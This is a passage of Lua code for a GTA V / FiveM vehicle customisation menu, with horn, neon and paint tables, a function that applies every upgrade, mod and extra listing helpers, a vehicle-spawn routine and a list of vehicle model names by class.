	["Jazz Horn 3"] = 27,
	["Jazz Loop Horn"] = 28,
	["Starspangban Horn 1"] = 28,
	["Starspangban Horn 2"] = 29,
	["Starspangban Horn 3"] = 30,
	["Starspangban Horn 4"] = 31,
	["Classical Loop 1"] = 32,
	["Classical Horn 8"] = 33,
	["Classical Loop 2"] = 34,

}

LSC.WheelType = {"Sport", "Muscle", "Lowrider", "SUV", "Offroad", "Tuner", "Bike", "High End"}

LSC.neonColors = {
	["White"] = {255,255,255},
	["Blue"] ={0,0,255},
	["Electric Blue"] ={0,150,255},
	["Mint Green"] ={50,255,155},
	["Lime Green"] ={0,255,0},
	["Yellow"] ={255,255,0},
	["Golden Shower"] ={204,204,0},
	["Orange"] ={255,128,0},
	["Red"] ={255,0,0},
	["Pony Pink"] ={255,102,255},
	["Hot Pink"] ={255,0,255},
	["Purple"] ={153,0,153},
}

LSC.paintsClassic = { -- kill me pls
	{name = "Black", id = 0},
	{name = "Carbon Black", id = 147},
	{name = "Graphite", id = 1},
	{name = "Anhracite Black", id = 11},
	{name = "Black Steel", id = 2},
	{name = "Dark Steel", id = 3},
	{name = "Silver", id = 4},
	{name = "Bluish Silver", id = 5},
	{name = "Rolled Steel", id = 6},
	{name = "Shadow Silver", id = 7},
	{name = "Stone Silver", id = 8},
	{name = "Midnight Silver", id = 9},
	{name = "Cast Iron Silver", id = 10},
	{name = "Red", id = 27},
	{name = "Torino Red", id = 28},
	{name = "Formula Red", id = 29},
	{name = "Lava Red", id = 150},
	{name = "Blaze Red", id = 30},
	{name = "Grace Red", id = 31},
	{name = "Garnet Red", id = 32},
	{name = "Sunset Red", id = 33},
	{name = "Cabernet Red", id = 34},
	{name = "Wine Red", id = 143},
	{name = "Candy Red", id = 35},
	{name = "Hot Pink", id = 135},
	{name = "Pfsiter Pink", id = 137},
	{name = "Salmon Pink", id = 136},
	{name = "Sunrise Orange", id = 36},
	{name = "Orange", id = 38},
	{name = "Bright Orange", id = 138},
	{name = "Gold", id = 99},
	{name = "Bronze", id = 90},
	{name = "Yellow", id = 88},
	{name = "Race Yellow", id = 89},
	{name = "Dew Yellow", id = 91},
	{name = "Dark Green", id = 49},
	{name = "Racing Green", id = 50},
	{name = "Sea Green", id = 51},
	{name = "Olive Green", id = 52},
	{name = "Bright Green", id = 53},
	{name = "Gasoline Green", id = 54},
	{name = "Lime Green", id = 92},
	{name = "Midnight Blue", id = 141},
	{name = "Galaxy Blue", id = 61},
	{name = "Dark Blue", id = 62},
	{name = "Saxon Blue", id = 63},
	{name = "Blue", id = 64},
	{name = "Mariner Blue", id = 65},
	{name = "Harbor Blue", id = 66},
	{name = "Diamond Blue", id = 67},
	{name = "Surf Blue", id = 68},
	{name = "Nautical Blue", id = 69},
	{name = "Racing Blue", id = 73},
	{name = "Ultra Blue", id = 70},
	{name = "Light Blue", id = 74},
	{name = "Chocolate Brown", id = 96},
	{name = "Bison Brown", id = 101},
	{name = "Creeen Brown", id = 95},
	{name = "Feltzer Brown", id = 94},
	{name = "Maple Brown", id = 97},
	{name = "Beechwood Brown", id = 103},
	{name = "Sienna Brown", id = 104},
	{name = "Saddle Brown", id = 98},
	{name = "Moss Brown", id = 100},
	{name = "Woodbeech Brown", id = 102},
	{name = "Straw Brown", id = 99},
	{name = "Sandy Brown", id = 105},
	{name = "Bleached Brown", id = 106},
	{name = "Schafter Purple", id = 71},
	{name = "Spinnaker Purple", id = 72},
	{name = "Midnight Purple", id = 142},
	{name = "Bright Purple", id = 145},
	{name = "Cream", id = 107},
	{name = "Ice White", id = 111},
	{name = "Frost White", id = 112},
}

LSC.paintsMatte = {
	{name = "Black", id = 12},
	{name = "Gray", id = 13},
	{name = "Light Gray", id = 14},
	{name = "Ice White", id = 131},
	{name = "Blue", id = 83},
	{name = "Dark Blue", id = 82},
	{name = "Midnight Blue", id = 84},
	{name = "Midnight Purple", id = 149},
	{name = "Schafter Purple", id = 148},
	{name = "Red", id = 39},
	{name = "Dark Red", id = 40},
	{name = "Orange", id = 41},
	{name = "Yellow", id = 42},
	{name = "Lime Green", id = 55},
	{name = "Green", id = 128},
	{name = "Forest Green", id = 151},
	{name = "Foliage Green", id = 155},
	{name = "Olive Darb", id = 152},
	{name = "Dark Earth", id = 153},
	{name = "Desert Tan", id = 154},
}

LSC.paintsMetal = {
	{name = "Brushed Steel", id = 117},
	{name = "Brushed Black Steel", id = 118},
	{name = "Brushed Aluminum", id = 119},
	{name = "Pure Gold", id = 158},
	{name = "Brushed Gold", id = 159},
}

function LSC.GetHornName(index)
	if (index == 0) then
		return "Truck Horn"
	elseif (index == 1) then
		return "Cop Horn"
	elseif (index == 2) then
		return "Clown Horn"
	elseif (index == 3) then
		return "Musical Horn 1"
	elseif (index == 4) then
		return "Musical Horn 2"
	elseif (index == 5) then
		return "Musical Horn 3"
	elseif (index == 6) then
		return "Musical Horn 4"
	elseif (index == 7) then
		return "Musical Horn 5"
	elseif (index == 8) then
		return "Sad Trombone"
	elseif (index == 9) then
		return "Classical Horn 1"
	elseif (index == 10) then
		return "Classical Horn 2"
	elseif (index == 11) then
		return "Classical Horn 3"
	elseif (index == 12) then
		return "Classical Horn 4"
	elseif (index == 13) then
		return "Classical Horn 5"
	elseif (index == 14) then
		return "Classical Horn 6"
	elseif (index == 15) then
		return "Classical Horn 7"
	elseif (index == 16) then
		return "Scale - Do"
	elseif (index == 17) then
		return "Scale - Re"
	elseif (index == 18) then
		return "Scale - Mi"
	elseif (index == 19) then
		return "Scale - Fa"
	elseif (index == 20) then
		return "Scale - Sol"
	elseif (index == 21) then
		return "Scale - La"
	elseif (index == 22) then
		return "Scale - Ti"
	elseif (index == 23) then
		return "Scale - Do"
	elseif (index == 24) then
		return "Jazz Horn 1"
	elseif (index == 25) then
		return "Jazz Horn 2"
	elseif (index == 26) then
		return "Jazz Horn 3"
	elseif (index == 27) then
		return "Jazz Horn Loop"
	elseif (index == 28) then
		return "Star Spangled Banner 1"
	elseif (index == 29) then
		return "Star Spangled Banner 2"
	elseif (index == 30) then
		return "Star Spangled Banner 3"
	elseif (index == 31) then
		return "Star Spangled Banner 4"
	elseif (index == 32) then
		return "Classical Horn 8 Loop"
	elseif (index == 33) then
		return "Classical Horn 9 Loop"
	elseif (index == 34) then
		return "Classical Horn 10 Loop"
	elseif (index == 35) then
		return "Classical Horn 8"
	elseif (index == 36) then
		return "Classical Horn 9"
	elseif (index == 37) then
		return "Classical Horn 10"
	elseif (index == 38) then
		return "Funeral Loop"
	elseif (index == 39) then
		return "Funeral"
	elseif (index == 40) then
		return "Spooky Loop"
	elseif (index == 41) then
		return "Spooky"
	elseif (index == 42) then
		return "San Andreas Loop"
	elseif (index == 43) then
		return "San Andreas"
	elseif (index == 44) then
		return "Liberty City Loop"
	elseif (index == 45) then
		return "Liberty City"
	elseif (index == 46) then
		return "Festive 1 Loop"
	elseif (index == 47) then
		return "Festive 1"
	elseif (index == 48) then
		return "Festive 2 Loop"
	elseif (index == 49) then
		return "Festive 2"
	elseif (index == 50) then
		return "Festive 3 Loop"
	elseif (index == 51) then
		return "Festive 3"
	else
		return "Unknown Horn"
	end
end

function LSC.UpdateMods()
	currentMods = Swag.Game.GetVehicleProperties(Swag.Player.Vehicle)
	--SetVehicleModKit(Swag.Player.Vehicle, 0)
end

function MaxOut1()
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
	SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
	SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
	SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
	SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 0, true)
	SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 1, true)
	SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 2, true)
	SetVehicleNeonLightEnabled(GetVehiclePedIsIn(GetPlayerPed(-1)), 3, true)
	SetVehicleNeonLightsColour(GetVehiclePedIsIn(GetPlayerPed(-1)), 222, 222, 255)
end

function LSC:CheckValidVehicleExtras()
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}

	for i=0,50,1 do
		if(DoesExtraExist(playerVeh, i))then
			local realModName = "Extra #"..tostring(i)
			local text = "OFF"
			if(IsVehicleExtraTurnedOn(playerVeh, i))then
				text = "ON"
			end
			local realSpawnName = "extra "..tostring(i)
			table.insert(valid, {
				menuName=realModName,
				data ={
					["action"] = realSpawnName,
					["state"] = text
				}
			})
		end
	end

	return valid
end


function LSC:DoesVehicleHaveExtras(vehicle)
	for i = 1, 30 do
		if ( DoesExtraExist( vehicle, i ) ) then
			return true
		end
	end

	return false
end

local function GetResources()
	local resources = {}
	for i=0, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
	end
	return resources
end
local serverOptionsResources = {}
serverOptionsResources = GetResources()


function LSC:CheckValidVehicleMods(modID)
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}
	local modCount = GetNumVehicleMods(playerVeh,modID)

	-- Handle Liveries if they don't exist in modCount
	if (modID == 48 and modCount == 0) then

		-- Local to prevent below code running.
		local modCount = GetVehicleLiveryCount(playerVeh)
		for i=1, modCount, 1 do
			local realIndex = i - 1
			local modName = GetLiveryName(playerVeh, realIndex)
			local realModName = GetLabelText(modName)
			local modid, realSpawnName = modID, realIndex

			valid[i] = {
				menuName=realModName,
				data = {
					["modid"] = modid,
					["realIndex"] = realSpawnName
				}
			}
		end
	end
	-- Handles all other mods
	for i = 1, modCount, 1 do
		local realIndex = i - 1
		local modName = GetModTextLabel(playerVeh, modID, realIndex)
		local realModName = GetLabelText(modName)
		local modid, realSpawnName = modCount, realIndex


		valid[i] = {
			menuName=realModName,
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		}
	end


	-- Insert Stock Option for modifications
	if(modCount > 0)then
		local realIndex = -1
		local modid, realSpawnName = modID, realIndex
		table.insert(valid, 1, {
			menuName="Stock",
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		})
	end

	return valid
end
---------------------
--  Vehicle Class  --
---------------------
local function SpawnLocalVehicle(modelName, replaceCurrent, spawnInside)
	local speed = 0
	local rpm = 0

	if Swag.Player.IsInVehicle then
		local oldVehicle = Swag.Player.Vehicle
		speed = GetEntitySpeedVector(oldVehicle, true).y
		rpm = GetVehicleCurrentRpm(oldVehicle)
	end

	if IsModelValid(modelName) and IsModelAVehicle(modelName) then
		RequestModel(modelName)

		while not HasModelLoaded(modelName) do
			Wait(0)
		end

		local pos = (spawnInside and GetEntityCoords(PlayerPedId()) or GetOffsetFromEntityInWorldCoords(PlayerPedId(), 0.0, 4.0, 0.0))
		local heading = GetEntityHeading(PlayerPedId()) + (spawnInside and 0 or 90)

		if replaceCurrent then
			RemoveVehicle(Swag.Player.Vehicle)
		end

		local vehicle = CreateVehicle(GetHashKey(modelName), pos.x, pos.y, pos.z, heading, true, false)

		if spawnInside then
			SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
			SetVehicleEngineOn(vehicle, true, true)
		end
		
		SetVehicleForwardSpeed(vehicle, speed)
		SetVehicleCurrentRpm(vehicle, rpm)
		
		SetEntityAsNoLongerNeeded(vehicle)

		SetModelAsNoLongerNeeded(modelName)
	end


end


local VehicleClass = {
	
	-- VEHICLES LISTS
	compacts = {
		{"BLISTA"},
		{"BRIOSO", "sssa_dlc_stunt"},
		{"DILETTANTE", "sssa_default", "dilettan"},
		-- {"DILETTANTE2"},
		{"ISSI2", "sssa_default"},
		{"ISSI3", "sssa_dlc_assault"},
		{"ISSI4"},
		{"ISSI5"},
		{"ISSI6"},
		{"PANTO", "sssa_dlc_hipster"},
		{"PRAIRIE", "sssa_dlc_battle"},
		{"RHAPSODY", "sssa_dlc_hipster"}
	},
	
	sedans = {
		{"ASEA", "sssa_dlc_business"},
		{"ASEA2"},
		{"ASTEROPE", "sssa_dlc_business", "astrope"},
		{"COG55", "lgm_dlc_apartments"},
		{"COG552", "lgm_dlc_apartments", "cog55"},
		{"COGNOSCENTI", "lgm_dlc_apartments", "cognosc"},
		{"COGNOSCENTI2", "lgm_dlc_apartments", "cognosc"},
		{"EMPEROR"},
		{"EMPEROR2"},
		{"EMPEROR3"},
		{"FUGITIVE", "sssa_default"},
		{"GLENDALE", "sssa_dlc_hipster"},
		{"INGOT", "sssa_dlc_business"},
		{"INTRUDER", "sssa_dlc_business"},
		{"LIMO2"},
		{"PREMIER", "sssa_dlc_business"},
		{"PRIMO"},
		{"PRIMO2", "lsc_default"},
		{"REGINA"},
		{"ROMERO", "sssa_dlc_battle"},
		{"SCHAFTER2", "sssa_dlc_heist"},
		{"SCHAFTER5"},
		{"SCHAFTER6"},
		{"STAFFORD", "lgm_dlc_battle"},
		{"STANIER", "sssa_dlc_business"},
		{"STRATUM", "sssa_dlc_business"},
		{"STRETCH", "sssa_default"},
		{"SUPERD", "lgm_default"},
		{"SURGE", "sssa_dlc_heist"},
		{"TAILGATER"},
		{"WARRENER"},
		{"WASHINGTON", "sssa_dlc_business", "washingt"},
	},
	
	suvs = {
		{"BALLER"},
		{"BALLER2", "sssa_default"},
		{"BALLER3", "lgm_dlc_apartments"},
		{"BALLER4", "lgm_dlc_apartments"},
		{"BALLER5"},
		{"BALLER6"},
		{"BJXL", "sssa_dlc_battle"},
		{"CAVALCADE", "sssa_default", "cavcade"},
		{"CAVALCADE2", "sssa_dlc_business", "cavcade2"},
		{"CONTENDER", "sssa_dlc_mp_to_sp"},
		{"DUBSTA"},
		{"DUBSTA2"},
		{"FQ2", "sssa_dlc_battle"},
		{"GRANGER", "sssa_dlc_business"},
		{"GRESLEY", "sssa_dlc_heist"},
		{"HABANERO", "sssa_dlc_battle"},
		{"HUNTLEY", "lgm_dlc_business2"},
		{"LANDSTALKER", "sssa_dlc_heist"},
		{"MESA", "candc_default"},
		{"MESA2"},
		{"PATRIOT", "sssa_dlc_battle"},
		{"PATRIOT2", "sssa_dlc_battle"},
		{"RADI", "sssa_dlc_business"},
		{"ROCOTO", "sssa_default"},
		{"SEMINOLE", "sssa_dlc_heist"},
		{"SERRANO", "sssa_dlc_battle"},
		{"TOROS", "lgm_dlc_apartments"},
		{"XLS", "lgm_dlc_executive1"},
		{"XLS2"},
	},
	
	coupes = {
		{"COGCABRIO", "lgm_default", "cogcabri"},
		{"EXEMPLAR", "sssa_default"},
		{"F620", "sssa_dlc_business"},
		{"FELON", "sssa_default"},
		{"FELON2", "sssa_default"},
		{"JACKAL", "sssa_dlc_heist"},
		{"ORACLE", "sssa_default"},
		{"ORACLE2"},
		{"SENTINEL", "sssa_dlc_business"},
		{"SENTINEL2"},
		{"WINDSOR", "lgm_dlc_swage"},
		{"WINDSOR2", "lgm_dlc_executive1"},
		{"ZION", "sssa_default"},
		{"ZION2", "sssa_default"},
	},
	
	muscle = {
		{"BLADE", "sssa_dlc_heist"},
		{"BUCCANEER"},
		{"BUCCANEER2", "lsc_default"},
		{"CHINO", "lgm_dlc_swage"},
		{"CHINO2", "lsc_default"},
		{"CLIQUE", "lgm_dlc_arena"},
		{"COQUETTE3", "lgm_dlc_swage"},
		{"DEVIANT", "lgm_dlc_apartments"},
		{"DOMINATOR", "sssa_dlc_business", "dominato"},
		{"DOMINATOR2", "sssa_dlc_mp_to_sp"},
		{"DOMINATOR3", "sssa_dlc_assault"},
		{"DOMINATOR4"},
		{"DOMINATOR5"},
		{"DOMINATOR6"},
		{"DUKES", "candc_default"},
		{"DUKES2", "candc_default"},
		{"ELLIE", "sssa_dlc_assault"},
		{"FACTION"},
		{"FACTION2", "lsc_default"},
		{"FACTION3", "lsc_lowrider"},
		{"GAUNTLET", "sssa_default"},
		{"GAUNTLET2", "sssa_dlc_mp_to_sp"},
		{"HERMES", "sssa_dlc_xmas2017"},
		{"HOTKNIFE", "lgm_default"},
		{"HUSTLER", "lgm_dlc_xmas2017"},
		{"IMPALER", "sssa_dlc_vinewood"},
		{"IMPALER2"},
		{"IMPALER3"},
		{"IMPALER4"},
		{"IMPERATOR"},
		{"IMPERATOR2"},
		{"IMPERATOR3"},
		{"LURCHER", "sssa_dlc_halloween"},
		{"MOONBEAM"},
		{"MOONBEAM2", "lsc_default"},
		{"NIGHTSHADE", "lgm_dlc_apartments", "NITESHAD"},
		{"PHOENIX"},
		{"PICADOR"},
		{"RATLOADER"},
		{"RATLOADER2"},
		{"RUINER", "sssa_dlc_battle"},
		{"RUINER2", "candc_importexport"},
		{"RUINER3"},
		{"SABREGT"},
		{"SABREGT2", "lsc_lowrider2"},
		{"SLAMVAN", "sssa_dlc_christmas_2"},
		{"SLAMVAN2"},
		{"SLAMVAN3", "lsc_lowrider2"},
		{"SLAMVAN4"},
		{"SLAMVAN5"},
		{"SLAMVAN6"},
		{"STALION", "sssa_dlc_mp_to_sp"},
		{"STALION2", "sssa_dlc_mp_to_sp"},
		{"TAMPA", "sssa_dlc_christmas_3"},
		{"TAMPA3", "candc_gunrunning"},
		{"TULIP", "sssa_dlc_arena"},
		{"VAMOS", "sssa_dlc_arena"},
		{"VIGERO", "sssa_default"},
		{"VIRGO", "lgm_dlc_swage"},
		{"VIRGO2", "lsc_lowrider"},
		{"VIRGO3"},
		{"VOODOO", "lsc_default"},
		{"VOODOO2"},
		{"YOSEMITE", "sssa_dlc_xmas2017"},
	},
	
	sportsclassics = {
		{"ARDENT", "candc_gunrunning"},
		{"BTYPE"},
		{"BTYPE2", "sssa_dlc_halloween"},
		{"BTYPE3"},
		{"CASCO", "lgm_dlc_heist"},
		{"CHEBUREK", "sssa_dlc_assault"},
		{"CHEETAH2", "lgm_dlc_executive1"},
		{"COQUETTE2", "lgm_dlc_pilot"},
		{"DESWAGO", "candc_xmas2017"},
		{"FAGALOA", "sssa_dlc_assault"},
		{"FELTZER3", "lgm_dlc_swage"},
		{"GT500", "lgm_dlc_xmas2017"},
		{"INFERNUS2", "lgm_dlc_specialraces"},
		{"JB700", "lgm_default"},
		{"JESTER3", "lgm_dlc_apartments"},
		{"MAMBA", "lgm_dlc_apartments"},
		{"MANANA"},
		{"MICHELLI", "sssa_dlc_assault"},
		{"MONROE", "lgm_default"},
		{"PEYOTE"},
		{"PIGALLE"},
		{"RAPIDGT3", "lgm_dlc_smuggler"},
		{"RETINUE", "sssa_dlc_mp_to_sp"},
		{"SAVESTRA", "lgm_dlc_xmas2017"},
		{"STINGER", "lgm_default"},
		{"STINGERGT", "lgm_default", "stingerg"},
		{"STROMBERG", "candc_xmas2017"},
		{"SWINGER", "lgm_dlc_battle"},
		{"TORERO", "lgm_dlc_executive1"},
		{"TORNADO"},
		{"TORNADO2"},
		{"TORNADO3"},
		{"TORNADO4"},
		{"TORNADO5", "lsc_lowrider2"},
		{"TORNADO6", "sssa_dlc_biker"},
		{"TURISMO2", "lgm_dlc_specialraces"},
		{"VISERIS", "lgm_dlc_xmas2017"},
		{"Z190", "lgm_dlc_xmas2017"},
		{"ZTYPE", "lgm_default"},
	},
	
	sports = {
		{"ALPHA", "lgm_dlc_business"},
		{"BANSHEE", "lgm_default"},
		{"BESTIAGTS", "lgm_dlc_executive1"},
		{"BLISTA2", "sssa_dlc_mp_to_sp"},
		{"BLISTA3", "sssa_dlc_arena"},
		{"BUFFALO"},
		{"BUFFALO2"},
		{"BUFFALO3", "sssa_dlc_mp_to_sp"},
		{"CARBONIZZARE", "lgm_default", "carboniz"},
		{"COMET2", "sssa_default"},
		{"COMET3", "lsc_dlc_import_export"},
		{"COMET4", "lgm_dlc_xmas2017"},
		{"COMET5", "lgm_dlc_xmas2017"},
		{"COQUETTE", "lgm_default"},
		{"ELEGY", "lsc_dlc_import_export"},
		{"ELEGY2", "lgm_default"},
		{"FELTZER2", "lgm_default"},
		{"FLASHGT", "lgm_dlc_apartments"},
		{"FUROREGT", "lgm_dlc_its_creator", "furore"},
		{"FUSILADE", "sssa_dlc_business"},
		{"FUTO", "sssa_dlc_battle"},
		{"GB200", "lgm_dlc_apartments"},
		{"HOTRING", "sssa_dlc_assault"},
		{"ITALIGTO", "lgm_dlc_apartments"},
		{"JESTER", "lgm_dlc_business"},
		{"JESTER2", "sssa_dlc_christmas_2"},
		{"KHAMELION", "lgm_default"},
		{"KURUMA", "sssa_dlc_heist"},
		{"KURUMA2", "sssa_dlc_heist"},
		{"LYNX", "lgm_dlc_stunt"},
		{"MASSACRO", "lgm_dlc_business2"},
		{"MASSACRO2", "sssa_dlc_christmas_2"},
		{"NEON", "lgm_dlc_xmas2017"},
		{"NINEF", "lgm_default"},
		{"NINEF2", "lgm_default"},
		{"OMNIS", "sssa_dlc_mp_to_sp"},
		{"PARIAH", "lgm_dlc_xmas2017"},
		{"PENUMBRA", "sssa_dlc_business"},
		{"RAIDEN", "lgm_dlc_xmas2017"},
		{"RAPIDGT", "lgm_default"},
		{"RAPIDGT2", "lgm_default"},
		{"RAPTOR", "lgm_dlc_biker"},
		{"REVOLTER", "lgm_dlc_xmas2017"},
		{"RUSTON", "lgm_dlc_specialraces"},
		{"SCHAFTER2"},
		{"SCHAFTER3", "lgm_dlc_apartments"},
		{"SCHAFTER4", "lgm_dlc_apartments"},
		{"SCHAFTER5"},
		{"SCHLAGEN", "lgm_dlc_apartments"},
		{"SCHWARZER", "sssa_default", "schwarze"},
		{"SENTINEL3", "sssa_dlc_xmas2017"},
		{"SEVEN70", "lgm_dlc_executive1"},
		{"SPECTER"},
		{"SPECTER2", "lsc_dlc_import_export"},
		{"SULTAN"},
		{"SURANO", "lgm_default"},
		{"TAMPA2"},
		{"TROPOS"},
		{"VERLIERER2", "lgm_dlc_apartments", "verlier"},
		{"ZR380"},
		{"ZR3802"},
		{"ZR3803"},
	},
	
	super = {
		{"ADDER", "lgm_default"},
		{"AUTARCH", "lgm_dlc_xmas2017"},
		{"BANSHEE2", "lgm_default"},
		{"BULLET", "lgm_default"},
		{"CHEETAH", "lgm_default"},
		{"CYCLONE", "lgm_dlc_smuggler"},
		{"DEVESTE", "lgm_dlc_apartments"},
		{"ENTITYXF", "lgm_default"},
		{"ENTITY2", "lgm_dlc_apartments"},
		{"FMJ", "lgm_dlc_executive1"},
		{"GP1", "lgm_dlc_specialraces"},
		{"INFERNUS", "lgm_default"},
		{"ITALIGTB"},
		{"ITALIGTB2", "lsc_dlc_import_export"},
		{"LE7B", "lgm_dlc_stunt"},
		{"NERO"},
		{"NERO2", "lsc_dlc_import_export"},
		{"OSIRIS", "lgm_dlc_swage"},
		{"PENETRATOR", "lgm_dlc_heist"},
		{"PFISTER811", "lgm_dlc_executive1"},
		{"PROTOTIPO", "lgm_dlc_executive1"},
		{"REAPER", "lgm_dlc_executive1"},
		{"SC1", "lgm_dlc_xmas2017"},
		{"SCRAMJET", "candc_battle"},
		{"SHEAVA", "lgm_dlc_stunt"},
		{"SULTANRS", "lsc_jan2016", "sultan2"},
		{"T20", "lgm_dlc_swage"},
		{"TAIPAN", "lgm_dlc_apartments"},
		{"TEMPESTA", "lgm_dlc_heist"},
		{"TEZERACT", "lgm_dlc_apartments"},
		{"TURISMOR", "lgm_dlc_business"},
		{"TYRANT", "lgm_dlc_apartments"},
		{"TYRUS", "lgm_dlc_stunt"},
		{"VACCA", "lgm_default"},
		{"VAGNER", "lgm_dlc_executive1"},
		{"VIGILANTE", "candc_smuggler"},
		{"VISIONE", "lgm_dlc_smuggler"},
		{"VOLTIC", "lgm_default", "voltic_tless"},
		{"VOLTIC2", "candc_importexport"},
		{"XA21", "lgm_dlc_executive1"},
		{"ZENTORNO", "lgm_dlc_business2"},
	},
	
	motorcycles = {
		{"AKUMA", "sssa_default"},
		{"AVARUS", "sssa_dlc_biker"},
		{"BAGGER", "sssa_dlc_biker"},
		{"BATI", "sssa_default"},
		{"BATI2", "sssa_default"},
		{"BF400", "sssa_dlc_mp_to_sp"},
		{"CARBONRS", "lgm_default", "carbon"},
		{"CHIMERA", "sssa_dlc_biker"},
		{"CLIFFHANGER", "sssa_dlc_mp_to_sp"},
		{"DAEMON"},
		{"DAEMON2", "sssa_dlc_biker"},
		{"DEFILER", "sssa_dlc_biker"},
		{"DEATHBIKE"},
		{"DEATHBIKE2"},
		{"DEATHBIKE3"},
		{"DIABLOUS"},
		{"DIABLOUS2", "lsc_dlc_import_export"},
		{"DOUBLE", "sssa_default"},
		{"ENDURO", "sssa_dlc_heist"},
		{"ESSKEY", "sssa_dlc_biker"},
		{"FAGGIO", "sssa_default"},
		{"FAGGIO2"},
